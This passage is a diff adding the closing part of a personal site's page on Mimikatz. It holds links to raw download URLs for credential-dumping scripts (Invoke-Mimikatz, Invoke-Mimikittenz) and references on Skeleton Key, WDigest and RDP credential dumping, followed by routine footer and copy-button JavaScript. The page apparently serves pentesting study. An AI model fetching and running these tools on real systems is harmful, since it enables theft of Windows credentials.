+<li><a href="https://raw.githubusercontent.com/PowerSploit/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a> from PowerSploit</li>
+</ul>
+<p>Additional memory information:</p>
+<ul>
+<li><a href="https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1">Invoke-Mimikittenz</a></li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://adsecurity.org/?page_id=1821">Unofficial Guide to Mimikatz &amp; Command Reference</a></li>
+<li><a href="https://pentestlab.blog/2018/04/10/skeleton-key/">Skeleton Key</a></li>
+<li><a href="https://www.adamcouch.co.uk/reversing-wdigest-configuration-in-windows-server-2012-r2-and-windows-server-2016/">Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016</a></li>
+<li><a href="https://pentestlab.blog/2021/05/24/dumping-rdp-credentials/">Dumping RDP Credentials</a></li>
+</ul>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — tools & utilities / mimikatz · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="tools-utilities.html">tools &amp; utilities</a>
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');var ic=a.parentElement;if(ic&&ic.scrollWidth>ic.clientWidth){ic.scrollTo({left:a.offsetLeft-ic.clientWidth/2+a.offsetWidth/2,behavior:'smooth'});}}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
